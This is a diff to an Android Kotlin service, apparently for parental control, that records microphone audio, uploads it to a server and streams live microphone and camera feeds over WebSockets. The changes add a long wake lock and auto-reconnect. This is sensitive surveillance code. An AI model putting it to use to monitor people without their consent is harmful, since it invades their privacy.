@@ -12,6 +12,7 @@ import android.media.MediaRecorder
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
+import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -34,6 +35,7 @@ class MonitoringService : Service() {
     private val BUFFER_SIZE = AudioRecord.getMinBufferSize(
         SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
     ) * 2
+    private var wakeLock: PowerManager.WakeLock? = null
 
     private var cameraDevice: CameraDevice? = null
     private var imageReader: ImageReader? = null
@@ -48,6 +50,16 @@ class MonitoringService : Service() {
         super.onCreate()
         createNotificationChannel()
         startForeground(1, buildNotification())
+        acquireWakeLock()
+    }
+
+    private fun acquireWakeLock() {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "ParentControl::MonitoringWakeLock"
+        )
+        wakeLock?.acquire(10 * 60 * 60 * 1000L) // 10 hours
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -78,7 +90,9 @@ class MonitoringService : Service() {
     }
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
+        val channel = NotificationChannel(
+            CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW
+        )
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
@@ -109,7 +123,9 @@ class MonitoringService : Service() {
                     .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                     .addFormDataPart("device", DEVICE_NAME)
                     .build()
-                OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
+                OkHttpClient().newCall(
+                    Request.Builder().url(SERVER_URL).post(body).build()
+                ).execute()
                 file.delete()
             } catch (e: Exception) { e.printStackTrace() }
         }.start()
@@ -117,13 +133,23 @@ class MonitoringService : Service() {
 
     private fun startLiveStream() {
         isLive = true
-        wsAudio = OkHttpClient().newWebSocket(
-            Request.Builder().url("$WS_URL?type=child&device=${DEVICE_NAME}").build(),
+        val client = OkHttpClient.Builder()
+            .pingInterval(20, java.util.concurrent.TimeUnit.SECONDS)
+            .build()
+        wsAudio = client.newWebSocket(
+            Request.Builder().url("$WS_URL?type=child&device=$DEVICE_NAME").build(),
             object : WebSocketListener() {
                 override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                     streamMicToWebSocket(webSocket)
                 }
                 override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
+                    isLive = false
+                    // Auto reconnect
+                    Handler(mainLooper).postDelayed({
+                        if (isLive) startLiveStream()
+                    }, 3000)
+                }
+                override fun onClosed(webSocket: okhttp3.WebSocket, code: Int, reason: String) {
                     isLive = false
                 }
             }
@@ -161,10 +187,11 @@ class MonitoringService : Service() {
 
         val okClient = OkHttpClient.Builder()
             .writeTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
+            .pingInterval(20, java.util.concurrent.TimeUnit.SECONDS)
             .build()
 
         wsCamera = okClient.newWebSocket(
-            Request.Builder().url("$WS_URL?type=camera&device=${DEVICE_NAME}").build(),
+            Request.Builder().url("$WS_URL?type=camera&device=$DEVICE_NAME").build(),
             object : WebSocketListener() {
                 override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                     openCamera(webSocket)
@@ -234,6 +261,11 @@ class MonitoringService : Service() {
         cameraThread = null
         wsCamera?.close(1000, "Stop")
         wsCamera = null
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        wakeLock?.release()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
